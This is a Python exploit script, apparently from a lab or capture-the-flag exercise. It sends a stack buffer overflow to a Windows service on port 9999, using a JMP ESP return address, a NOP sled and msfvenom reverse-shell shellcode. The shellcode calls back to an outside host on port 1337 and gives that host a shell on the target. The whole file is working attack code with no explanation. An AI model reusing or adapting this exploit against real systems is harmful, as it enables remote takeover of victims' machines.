#!/usr/bin/env python3

import socket, sys

host = "10.10.4.24"
#host = "192.168.43.150"
port = 9999


offset = 524
overflow = "a"*offset
retn = "\xf3\x12\x17\x31"	# 311712F3   . FFE4           JMP ESP
padding = "\x90"*32
# no bad chars
# msfvenom -p windows/shell_reverse_tcp LPORT=10.14.10.227 LPORT=1337 EXITFUNC=thread -f py -v payload -b "\x00"
payload =  ""
payload += "\xd9\xe5\xd9\x74\x24\xf4\xbb\xb9\x33\xe8\x8e\x58"
payload += "\x31\xc9\xb1\x52\x31\x58\x17\x83\xe8\xfc\x03\xe1"
payload += "\x20\x0a\x7b\xed\xaf\x48\x84\x0d\x30\x2d\x0c\xe8"
payload += "\x01\x6d\x6a\x79\x31\x5d\xf8\x2f\xbe\x16\xac\xdb"
payload += "\x35\x5a\x79\xec\xfe\xd1\x5f\xc3\xff\x4a\xa3\x42"
payload += "\x7c\x91\xf0\xa4\xbd\x5a\x05\xa5\xfa\x87\xe4\xf7"
payload += "\x53\xc3\x5b\xe7\xd0\x99\x67\x8c\xab\x0c\xe0\x71"
payload += "\x7b\x2e\xc1\x24\xf7\x69\xc1\xc7\xd4\x01\x48\xdf"
payload += "\x39\x2f\x02\x54\x89\xdb\x95\xbc\xc3\x24\x39\x81"
payload += "\xeb\xd6\x43\xc6\xcc\x08\x36\x3e\x2f\xb4\x41\x85"
payload += "\x4d\x62\xc7\x1d\xf5\xe1\x7f\xf9\x07\x25\x19\x8a"
payload += "\x04\x82\x6d\xd4\x08\x15\xa1\x6f\x34\x9e\x44\xbf"
payload += "\xbc\xe4\x62\x1b\xe4\xbf\x0b\x3a\x40\x11\x33\x5c"
payload += "\x2b\xce\x91\x17\xc6\x1b\xa8\x7a\x8f\xe8\x81\x84"
payload += "\x4f\x67\x91\xf7\x7d\x28\x09\x9f\xcd\xa1\x97\x58"
payload += "\x31\x98\x60\xf6\xcc\x23\x91\xdf\x0a\x77\xc1\x77"
payload += "\xba\xf8\x8a\x87\x43\x2d\x1c\xd7\xeb\x9e\xdd\x87"
payload += "\x4b\x4f\xb6\xcd\x43\xb0\xa6\xee\x89\xd9\x4d\x15"
payload += "\x5a\x26\x39\x3e\x14\xce\x38\x40\x2d\x36\xb4\xa6"
payload += "\x47\x58\x90\x71\xf0\xc1\xb9\x09\x61\x0d\x14\x74"
payload += "\xa1\x85\x9b\x89\x6c\x6e\xd1\x99\x19\x9e\xac\xc3"
payload += "\x8c\xa1\x1a\x6b\x52\x33\xc1\x6b\x1d\x28\x5e\x3c"
payload += "\x4a\x9e\x97\xa8\x66\xb9\x01\xce\x7a\x5f\x69\x4a"
payload += "\xa1\x9c\x74\x53\x24\x98\x52\x43\xf0\x21\xdf\x37"
payload += "\xac\x77\x89\xe1\x0a\x2e\x7b\x5b\xc5\x9d\xd5\x0b"
payload += "\x90\xed\xe5\x4d\x9d\x3b\x90\xb1\x2c\x92\xe5\xce"
payload += "\x81\x72\xe2\xb7\xff\xe2\x0d\x62\x44\x02\xec\xa6"
payload += "\xb1\xab\xa9\x23\x78\xb6\x49\x9e\xbf\xcf\xc9\x2a"
payload += "\x40\x34\xd1\x5f\x45\x70\x55\x8c\x37\xe9\x30\xb2"
payload += "\xe4\x0a\x11"


s_buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print(s.recv(1024))
s.send(bytes(s_buffer + "\r\n", 'latin-1'))
s.recv(1024)
print("Application Crashed :)")